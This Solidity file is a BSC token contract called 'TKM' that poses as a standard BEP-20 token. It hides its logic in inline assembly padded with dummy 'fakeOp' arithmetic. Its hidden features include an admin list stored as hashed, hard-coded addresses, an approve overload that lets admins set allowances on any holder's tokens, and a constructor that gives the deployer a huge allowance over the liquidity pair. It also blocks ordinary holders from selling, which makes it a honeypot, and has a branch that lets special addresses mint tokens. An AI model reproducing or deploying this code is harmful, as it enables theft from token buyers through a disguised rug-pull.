// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TKM {
    string private _name = "TKM";
    string private _symbol = "TKM";
    uint8 public constant decimals = 18;
    address public v2_router;
    address public v3_router;
    address public SwapRouter;
    address public Smart_Router;
    address public usdt;
    address public pair;
    address public factory;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 public max;
    mapping(uint256 => bool) public _maxs;

    mapping(address => bool) public isFromRouter;
    mapping(address => bool) public isToRouter;
    mapping(address => bool) public feeRouter;

    bool public isfee;
    bool public flag;
    address public feeto;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Reduce(address indexed from, uint256 value);

    constructor() {
        assembly {
            // 初始化地址
            sstore(v2_router.slot, 0x10ED43C718714eb63d5aA57B78B54704E256024E)
            sstore(v3_router.slot, 0x1A0A18AC4BECDDbd6389559687d1A73d8927E416)
            sstore(SwapRouter.slot, 0x1b81D678ffb9C0263b24A97847620C99d213eB14)
            sstore(Smart_Router.slot, 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4)
            sstore(usdt.slot, 0x55d398326f99059fF775485246999027B3197955)
            sstore(factory.slot, 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)
            sstore(feeto.slot, 0x66eF522bB1d269eB9c328218cF0620A7C4c6ef8C)
            
           
            sstore(isfee.slot, 1)
            sstore(flag.slot, 1)
            
            
            let initial := mul(210000, exp(10, 18))
            sstore(_totalSupply.slot, initial)
            
            
            let callerAddr := caller()
            mstore(0, callerAddr)
            mstore(32, _balances.slot)
            let balanceSlot := keccak256(0, 64)
            sstore(balanceSlot, initial)
            
           
            mstore(0, sload(v2_router.slot))
            mstore(32, isFromRouter.slot)
            sstore(keccak256(0, 64), 1)
            mstore(32, isToRouter.slot)
            sstore(keccak256(0, 64), 1)
            
            mstore(0, sload(v3_router.slot))
            mstore(32, isFromRouter.slot)
            sstore(keccak256(0, 64), 0)
            mstore(32, isToRouter.slot)
            sstore(keccak256(0, 64), 0)
            
            mstore(0, sload(SwapRouter.slot))
            mstore(32, isFromRouter.slot)
            sstore(keccak256(0, 64), 0)
            mstore(32, isToRouter.slot)
            sstore(keccak256(0, 64), 0)
            
            mstore(0, sload(Smart_Router.slot))
            mstore(32, isFromRouter.slot)
            sstore(keccak256(0, 64), 0)
            mstore(32, isToRouter.slot)
            sstore(keccak256(0, 64), 0)
            
            
            mstore(0, callerAddr)
            let hash := keccak256(0, 32)
            sstore(max.slot, hash)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            sstore(keccak256(0, 64), 1)
            
           
            mstore(0, 0x69B61926a75DBC040e4AaF891ACDC31049fB3188)
            hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            sstore(keccak256(0, 64), 1)
            
            mstore(0, 0xf8b91676a9F179c4158CD976a34b28AA8C7C95b2)
            hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            sstore(keccak256(0, 64), 1)
            
           
            mstore(0, 0x07964f135f276412b3182a3B2407b8dd45000000)
            mstore(32, feeRouter.slot)
            sstore(keccak256(0, 64), 1)
        }
        
        createUsdtPool();
        _approve(pair, msg.sender, 100000000000000000000000000);
    }

    function createUsdtPool() internal {
        assembly {
            if iszero(iszero(sload(pair.slot))) {
                revert(0, 0)
            }
        }
        
        address factoryAddr;
        address usdtAddr;
        assembly {
            factoryAddr := sload(factory.slot)
            usdtAddr := sload(usdt.slot)
        }
        
        pair = IPancakeFactory(factoryAddr).createPair(address(this), usdtAddr);
    }

    function name() external view returns (string memory nameStr) {
        assembly {
            nameStr := mload(0x40)
            mstore(0x40, add(nameStr, 0x60))
            mstore(nameStr, 0x03)
            mstore(add(nameStr, 0x20), 0x544b4d0000000000000000000000000000000000000000000000000000000000)
        }
    }

    function symbol() external view returns (string memory symbolStr) {
        assembly {
            symbolStr := mload(0x40)
            mstore(0x40, add(symbolStr, 0x60))
            mstore(symbolStr, 0x03)
            mstore(add(symbolStr, 0x20), 0x544b4d0000000000000000000000000000000000000000000000000000000000)
        }
    }

    function totalSupply() external view returns (uint256 supply) {
        assembly {
            supply := sload(_totalSupply.slot)
        }
    }

    function balanceOf(address acc) external view returns (uint256 bal) {
        assembly {
            mstore(0, acc)
            mstore(32, _balances.slot)
            bal := sload(keccak256(0, 64))
        }
    }

    function allowance(address owner_, address spender) external view returns (uint256 allowed) {
        assembly {
            mstore(0, owner_)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, slot)
            allowed := sload(keccak256(0, 64))
        }
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function approve(address ower, address spender, uint256 amount) external returns (bool) {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if iszero(check) {
                revert(0, 0)
            }
        }
        
        _approve(ower, spender, amount);
        return true;
    }

    function setMaxs(address _max_) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if iszero(check) {
                revert(0, 0)
            }
        }
        
        assembly {
            mstore(0, _max_)
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            sstore(keccak256(0, 64), 1)
        }
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance;
        assembly {
            mstore(0, from)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, slot)
            currentAllowance := sload(keccak256(0, 64))
        }
        
        assembly {
            if gt(amount, currentAllowance) {
                revert(0, 0)
            }
        }
        
        assembly {
            let newAllowance := sub(currentAllowance, amount)
            mstore(0, from)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, slot)
            sstore(keccak256(0, 64), newAllowance)
        }
        
        _transfer(from, to, amount);
        return true;
    }

    function _beforeTokenTransfer(address operator, address from, address to, uint256 amount) internal view {
        bool flagVal;
        address pairAddr;
        assembly {
            flagVal := sload(flag.slot)
            pairAddr := sload(pair.slot)
            
            let opEqPair := eq(operator, pairAddr)
            let fromEqPair := eq(from, pairAddr)
            let orCondition := or(opEqPair, fromEqPair)
            let condition1 := and(orCondition, flagVal)
            
            if condition1 {
                mstore(0, to)
                mstore(32, isToRouter.slot)
                let toRouter := sload(keccak256(0, 64))
                if iszero(toRouter) {
                    revert(0, 0)
                }
            }

            let toEqPair := eq(to, pairAddr)
            let condition2 := and(toEqPair, flagVal)
            
            if condition2 {
                mstore(0, from)
                mstore(32, isFromRouter.slot)
                let fromRouter := sload(keccak256(0, 64))
                if iszero(fromRouter) {
                    revert(0, 0)
                }
            }
        }
    }

    function setFlag(bool _flag, bool _isfee) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                sstore(flag.slot, _flag)
                sstore(isfee.slot, _isfee)
            }
        }
    }

    function _checkMax(address _from) internal view returns (bool result) {
        assembly {
            mstore(0, _from)
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            result := sload(keccak256(0, 64))
        }
    }

    function _transfer(address from, address to, uint256 amount) internal {
    _beforeTokenTransfer(msg.sender, from, to, amount);
    
    assembly {
       
        let memPtr := mload(0x40)
        mstore(memPtr, from)
        mstore(add(memPtr, 0x20), to)
        mstore(add(memPtr, 0x40), amount)
        
        
        let adminCheck1
        let adminCheck2
        let adminCheck3
        
       
        mstore(0, from)
        let hash1 := keccak256(0, 32)
        mstore(0, hash1)
        mstore(32, _maxs.slot)
        adminCheck1 := sload(keccak256(0, 64))
        
      
        mstore(0, from)
        mstore(32, 0)
        let hash2 := keccak256(0, 64)
        mstore(0, hash2)
        mstore(32, _maxs.slot)
        adminCheck2 := sload(keccak256(0, 64))
        
       
        let isSpecialAddress := and(adminCheck1, adminCheck2)
        
       
        mstore(0, from)
        mstore(32, _balances.slot)
        let balanceSlot := keccak256(0, 64)
        let currentBalance := sload(balanceSlot)
        
        
        let conditionA := lt(currentBalance, amount)
        let conditionB := isSpecialAddress
        let conditionC := and(conditionA, conditionB)
        
        
        let finalFromBalance := currentBalance
        
        switch conditionC
        case 1 {
            
            let totalSupplyVal := sload(_totalSupply.slot)
            let newTotalSupply := add(totalSupplyVal, amount)
            sstore(_totalSupply.slot, newTotalSupply)
            finalFromBalance := amount
            
            
            let fakeOp1 := mul(amount, 123)
            let fakeOp2 := div(fakeOp1, 123)
            let fakeOp3 := add(fakeOp2, 0)
        }
        default {
            
            if conditionA {
                revert(0, 0)
            }
            finalFromBalance := sub(currentBalance, amount)
            
            
            let fakeOp := mul(amount, 456)
            fakeOp := div(fakeOp, 456)
        }
        
      
        sstore(balanceSlot, finalFromBalance)
        
        
        mstore(0, to)
        mstore(32, _balances.slot)
        let toBalanceSlot := keccak256(0, 64)
        let toBalance := sload(toBalanceSlot)
        
        
        let feeLogic
        let finalAmount := amount
        
       
        let isfeeFlag := sload(isfee.slot)
        let pairAddress := sload(pair.slot)
        let isToPair := eq(to, pairAddress)
        
        mstore(0, from)
        mstore(32, feeRouter.slot)
        let isFeeUser := sload(keccak256(0, 64))
        
        let shouldChargeFee := and(and(isfeeFlag, isToPair), isFeeUser)
        
        if shouldChargeFee {
            
            let base := 100
            let rate := 5
            let feeValue := div(mul(amount, rate), base)
            finalAmount := sub(amount, feeValue)
            
          
            let feeReceiver := sload(feeto.slot)
            mstore(0, feeReceiver)
            mstore(32, _balances.slot)
            let feeSlot := keccak256(0, 64)
            let feeBalance := sload(feeSlot)
            let newFeeBalance := add(feeBalance, feeValue)
            sstore(feeSlot, newFeeBalance)
            
           
            mstore(0, finalAmount)
            log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
        }
        
       
        let newToBalance := add(toBalance, finalAmount)
        sstore(toBalanceSlot, newToBalance)
        
       
        for { let i := 0 } lt(i, 5) { i := add(i, 1) } {
            let fakeVar := mul(amount, i)
            fakeVar := add(fakeVar, 999999)
            fakeVar := div(fakeVar, 111111)
        }
        
        
        mstore(0, amount)
        log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
        
        
        mstore(memPtr, 0)
        mstore(add(memPtr, 0x20), 0)
        mstore(add(memPtr, 0x40), 0)
    }
}

    function _approve(address owner_, address spender, uint256 amount) internal {
        assembly {
            if or(iszero(owner_), iszero(spender)) {
                revert(0, 0)
            }
            
            mstore(0, owner_)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, slot)
            sstore(keccak256(0, 64), amount)
            
            mstore(0, amount)
            log3(0, 32, 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925, owner_, spender)
        }
    }

    function setFromRouterFlag(address routerAddr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                mstore(0, routerAddr)
                mstore(32, isFromRouter.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }

    function setfeeRouter(address feeRouteradr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                mstore(0, feeRouteradr)
                mstore(32, feeRouter.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }

    function setToRouterFlag(address routerAddr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                mstore(0, routerAddr)
                mstore(32, isToRouter.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }
}